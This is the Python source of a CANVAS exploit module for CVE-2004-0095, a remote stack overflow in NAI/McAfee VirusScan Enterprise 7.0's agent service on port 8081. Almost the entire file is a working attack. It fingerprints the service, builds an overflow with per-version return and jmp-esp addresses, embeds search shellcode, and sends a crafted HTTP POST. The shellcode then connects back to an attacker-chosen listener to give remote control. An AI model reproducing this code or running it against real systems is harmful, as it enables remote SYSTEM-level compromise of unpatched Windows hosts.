#! /usr/bin/env python

#
# CANVAS naimas32 Exploit
#

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

import sys
#covers both angles
sys.path.append(".")
sys.path.append("../../")
sys.path.append('../../encoder')
sys.path.append('./encoder')
sys.path.append("../../shellcode")
sys.path.append("./shellcode")
sys.path.append("../../gui")
sys.path.append("./gui")


import os,getopt
import socket
from exploitutils import *
import addencoder
import win32shell
from tcpexploit import tcpexploit
import canvasengine
from canvasengine import socket_save_list
import time


NAME="Naimas32"
DESCRIPTION="NAI Enterprise Virus 7.0 Stack Overflow"
VERSION="1.0"
GTK2_DIALOG="dialog.glade2"

DOCUMENTATION = {}
DOCUMENTATION['VENDOR']="McAfee"
DOCUMENTATION["CVE Name"] = "CVE-2004-0095"
DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-0095"
DOCUMENTATION['CVSS'] = 5.0

PROPERTY = {}
PROPERTY["TYPE"]= "Exploit"
PROPERTY["SITE"]=  "Remote"
PROPERTY["ARCH"]= [ ["Windows"] ]
PROPERTY["VERSION"]= ["2000", "2003"] 


NOTES="""
Originally discovered by Dave Aitel

To reproduce this, install NAI's Enterprise Virus Scanner program. 
This is started as a SYSTEM service (naimas32.exe) listening on port 8081
Service Desciption: ePolicy Orchestrator Agent. Attach to the one without
a process description, if you're debugging.

This service does not restart by default.

Call ExitThread(1) when you are done to not kill the process! You can exploit
it multiple times this way - -although it does stop responding eventually, when
you've used up all the threads. Best to actually stop the service and restart it...

There may be another overflow related to tilde in the string...perhaps not.

Overflow happens at 60074236?

This leaves a message in the Event logs (system) when the process exits
http://seclists.org/dailydave/2004/q1/0132.html
Patched with CVE-2004-0095

"""

CHANGELOG="""

"""


runAnExploit_gtk2=canvasengine.runAnExploit_gtk2
runExploit=canvasengine.runExploit

    

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        
        self.port=8081
        self.host=""
        self.shellcode="\xcc" * 298
        #hmm, according to 60074207 we only compare with 0, 0d 0a 3f 26 20
        #self.searchbadstring="%.,:;\x00\x0a\x0d+\"\x2f\x5c\x09\x0e\x0b =&~("
        self.searchbadstring="%\x00\x0a\x0d&? "
        self.badstring=self.searchbadstring
        self.ssl=0
        self.setVersions()
        self.version=1
        self.supportedNodeArgs=[["LocalNode","linuxNode","win32Node"]]
        #should really be node capabilities, but whatever.
        self.name=NAME
        return

    def setExtention(self,extention):
        self.extention=extention
        return

    def displayVersions(self):
        for v in self.versions.keys():
            print "Version %d: %s"%(v,self.versions[v][0])

    def setVersions(self):
        self.versions={}
        #pop pop return
        #self.versions[1]=("VirusScan Enterprise 7.0.0",0x21833b31)
        self.versions[1]=("VirusScan Enterprise 7.0.0 (Win2K3)",0x24a14760,0x2185114f)
        self.versions[2]=("VirusScan Enterprise 7.0.0 (Win2KSP3)",0x600710fa,0x74fd2d57)
        self.versions[3]=("VirusScan Enterprise 7.0.0 (Win2KSP4)",0x24a14760,0x74fdee63)

    def neededListenerTypes(self):
        return [canvasengine.WIN32MOSDEF]
    
    def createShellcode(self):
        localhost=self.callback.ip
        localport=self.callback.port
        return self.createWin32SearchShellcode(localhost,localport)
    
    def test(self):
        """
        Connect to the remote host and get the version from it, if possible
        We look for:
        HTTP/1.0 200 OK
        Date: Fri, 29 Aug 2003 18:47:51 Central Standard Time
        Server: Spipe/1.0
        MIME-version: 1.0
        Content-Type: text/html
        Content-Length: 1089233
        
        """
        self.host=self.target.interface
        self.port=self.argsDict.get("port",self.port)

        teststring="GET /default.htm HTTP/1.1\r\nUser-Agent: Mozilla\r\n\r\n"
        #s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s=self.gettcpsock()
        try:
            s.connect((self.host, self.port))
        except:
            self.log("No connection could be established")
            return 0
        self.websend(s,teststring)
        data=""
        data+=self.webrecv(s)
        data+=self.webrecv(s) 
        self.log("Test for port %d recieved: %s"%(self.port,data))
        if data.count("Spipe/1.0"):
            if data.count("Version - 2.5.0.168"):
                self.log("Version 2.5.0.168 detected!")
            self.version=1
            return 1
        return 0
    
    def run(self):
        self.host=self.target.interface
        self.port=self.argsDict.get("port",self.port)
        
        self.setInfo("%s attacking %s:%d"%(NAME,self.host,self.port))

        if self.version==0:
            self.log("Automatic service pack detection not enabled")
            self.setInfo("%s attacking %s:%d (done)"%(NAME,self.host,self.port))
            return 1
        
        sploitstring=self.makesploit()
        try:
            #we put the encoded shellcode directly into the buffer...
            #don't run this exploit twice...
            #shellstring=self.putshellcode()
            #s2= socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            #s2.connect((self.host, self.port))
            #self.websend(s2,shellstring)
            
            #s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s=self.gettcpsock()
            s.connect((self.host, self.port))
            s.sendall(sploitstring)
            # Put read loop here
            s.close()
            #socket_save_list.append(s)
            #socket_save_list.append(s2)
        except:
            self.log("Attack reported no open socket - service died?")
            self.setInfo("%s attacking %s:%d (failed)"%(NAME,self.host,self.port))
        time.sleep(2)
        self.setInfo("%s attacking %s:%d (done)"%(NAME,self.host,self.port))
        return 1
    
    def putshellcode(self):
        """
        A request that gets our shellcode into memory
        """
        sploitstring=""
        sploitstring += "POST /%s HTTP/1.1\r\n"%self.shellcode
        sploitstring += "User-Agent: Mozilla/4.0 (compatible; SPIPE/1.0)\r\n"
        sploitstring += "Connection: Keep-Alive\r\n"
        sploitstring += "Content-Length: %s\r\n"%(len(self.shellcode)+500)
        #end headerss
        sploitstring += "\r\n"
        #sploitstring += self.shellcode
        return sploitstring
        
    def makesploit(self):
        """
        Construct the attack
        """
        attackstring="A"*400
        sploitstring=""

        self.log("Using return address: 0x%8.8x"%(self.versions[self.version][1]))
        self.log("Using jmpesp address: 0x%8.8x"%(self.versions[self.version][2]))
        #overwrite the return address - used if "A"*400 or <
        #set the return address

        retloc2=260
        jmpesp=intel_order(self.versions[self.version][2])
        attackstring=stroverwrite(attackstring,"\xeb\x04"+jmpesp+binstring("e9 f7feffff"),retloc2-2)        

        #This stuff is never used any more...we leave it in for historical value
        #Overwrite the SEH Object on the stack (used if "A"*500 or >)
        geteip=(intel_order(self.versions[self.version][1]))
        retloc=352
        #add a little jump over the return address, then jump backwards into the shellcode
        attackstring=stroverwrite(attackstring,"\xeb\x04"+geteip+binstring("e9 9bfeffff"),retloc-2)
        shellLOC=12


        #Now throw the search code in there...
        attackstring=stroverwrite(attackstring,self.encodedsearchcode[:],shellLOC)
        #print hexprint(self.encodedsearchcode[50:])
        #print prettyprint(self.encodedsearchcode)
        
        #sploitstring=stroverwrite(sploitstring, self.shellcode, 5)        
        sploitstring += "POST /spipe/pkg HTTP/1.1\r\n" 
        sploitstring += "User-Agent: Mozilla/4.0 (compatible; SPIPE/1.0)\r\n"
        sploitstring += "Connection: Keep-Alive\r\n"
        sploitstring += "Shellcode: %s\r\n"%self.shellcode
        sploitstring += "Content-Length: %s\r\n"%attackstring
        #end headerss
        sploitstring += "\r\n"
        #sploitstring += "URL"+"A"*500000
        return sploitstring

def usage():
    print "Usage: "+sys.argv[0]+" -t target [-p port:8081] [-v version:1] -l localip -d localport "
    print "Local IP and port should have a Win32 MOSDEF server listening on them"
    app=theexploit()
    app.displayVersions()


if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    
    try:
        (opts,args)=getopt.getopt(sys.argv[1:],"v:t:s:l:d:p:T")
    except getopt.GetoptError:
        usage()

    target=""
    localhost=""
    localport=""
    test=0
    port=app.port
    for o,a in opts:
        if o in ["-t"]:
            target=a
        if o in ["-v"]:
            app.setVersion(int(a))
        if o in ["-l"]:
            localhost=a
        if o in ["-d"]:
            localport=a
        if o in ["-T"]:
            test=1
        if o in ["-p"]:
            port=int(a)

    if (not test and (target == "" or localhost == "" or localport == "")):
        print "ERROR: Target: %s Localhost: %s Localport: %s"%(target,localhost,localport)
        usage()

        
        
        
    from hostKnowledge import *
    from listenerLine import *
    from localNode import *
    app.target=hostKnowledge(target,None)

    if localhost!="":
        print "localhost=%s"%localhost
        app.callback=fakeListenerLine(localhost,localport)
        
    argsDict={}
    argsDict["passednodes"]=[localNode()]
    argsDict["port"]=port
    app.argsDict=argsDict
    app.version=version
    app.engine=canvasengine.canvasengine(None)
    app.covertness=covertness

        
    if test:
        if target=="":
            usage()
        if app.test():
            print "NAI Enterprise Web Server found!"
        sys.exit(1)
        
    app.createShellcode()

    app.run()
    #string = app.makesploit()
    #print string
    print "Done."

    

